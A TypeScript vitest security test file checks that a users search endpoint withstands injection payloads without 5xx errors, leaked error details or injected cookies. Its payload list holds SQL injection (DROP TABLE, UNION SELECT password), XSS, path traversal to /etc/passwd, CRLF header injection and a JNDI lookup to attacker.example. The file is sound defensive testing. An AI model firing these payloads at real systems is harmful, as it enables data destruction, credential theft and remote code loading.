import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { UsersClient } from '../../src/clients/UsersClient.js';
import { listenApp } from '../helpers/app-context.js';
import { resetDatabase, seedMinimal } from '../helpers/database.js';

// Each entry produces an isolated test, useful to debug which payload broke.
const payloads: Array<{ label: string; value: string }> = [
  { label: "SQL: ' OR '1'='1", value: "' OR '1'='1" },
  { label: 'SQL: DROP TABLE users', value: "'; DROP TABLE users; --" },
  { label: 'SQL: UNION SELECT password', value: "1' UNION SELECT password FROM users--" },
  { label: 'XSS: <script>alert(1)</script>', value: '<script>alert(1)</script>' },
  { label: 'XSS: img onerror', value: '<img src=x onerror=alert(1)>' },
  { label: 'Path traversal: ../../../etc/passwd', value: '../../../etc/passwd' },
  { label: 'Path traversal Windows', value: '..\\..\\windows\\system32' },
  { label: 'JNDI: ldap injection', value: '${jndi:ldap://attacker.example/a}' },
  { label: 'NoSQL: $ne null', value: '{"$ne": null}' },
  { label: 'CRLF: Set-Cookie injection', value: 'test\r\nSet-Cookie: admin=true' },
  { label: 'Null byte: file.jpg', value: 'test%00.jpg' },
];

// Patterns that indicate a leaked stack trace, driver message, or native error.
const dangerousPatterns = [
  /SQL/i,
  /syntax error/i,
  /stack trace/i,
  /Error:/,
  /at \/(home|usr|var|opt)\//,
  /TypeError/,
  /SyntaxError/,
  /ReferenceError/,
  /PrismaClient/,
  /ECONNREFUSED/,
];

describe('Security: injection against GET /users?q=', () => {
  let baseURL: string;
  let close: () => Promise<void>;

  beforeAll(async () => {
    const handle = await listenApp();
    baseURL = handle.url;
    close = handle.close;
  });

  afterAll(async () => {
    await close();
  });

  beforeEach(async () => {
    await resetDatabase();
    await seedMinimal();
  });

  it.each(payloads)(
    'handles payload "$label" without 5xx, without leaking internal error, and without echoing the payload unescaped',
    async ({ value }) => {
      const client = new UsersClient(baseURL);
      const response = await client.search({ q: value });

      // Anything outside 2xx/legitimate 4xx means the payload took the app down.
      expect(
        [200, 400, 422].includes(response.status),
        `unexpected status ${response.status} for payload "${value}": ${JSON.stringify(response.data)}`,
      ).toBe(true);

      const body = JSON.stringify(response.data);
      for (const pattern of dangerousPatterns) {
        expect(
          body.match(pattern),
          `body leaked dangerous pattern ${pattern} for payload "${value}": ${body}`,
        ).toBeNull();
      }

      // If the response came back as 200 with a list, ensure no record literally
      // contains the payload in sensitive fields (it should not have matched anything in the seed).
      if (response.status === 200 && 'data' in (response.data as object)) {
        const data = response.data as { data: Array<{ email: string; name: string }> };
        for (const item of data.data) {
          expect(item.email).not.toContain(value);
          expect(item.name).not.toContain(value);
        }
      }
    },
  );

  it('XSS payload returned in an error message comes as valid JSON-escaped (no raw HTML)', async () => {
    const client = new UsersClient(baseURL);
    const payload = '<script>alert(1)</script>';
    const response = await client.search({ q: payload });

    // Server responds JSON; when a frontend renders this, a modern framework escapes
    // by default. Here we validate that the content type is not HTML.
    const contentType = response.headers['content-type'] ?? '';
    expect(contentType.toLowerCase()).toContain('application/json');
  });

  it('query parameter with a CRLF sequence does not inject a Set-Cookie in the response', async () => {
    // The native fetch client rejects headers with CRLF; we pass the payload via the
    // query string to guarantee the app does not reflect the content into a header.
    const client = new UsersClient(baseURL);
    const response = await client.search({ q: 'foo\r\nSet-Cookie: admin=true' });

    expect([200, 400, 422]).toContain(response.status);
    // headers come normalized to lowercase by the wrapper
    expect(response.headers['set-cookie']).toBeUndefined();
  });
});
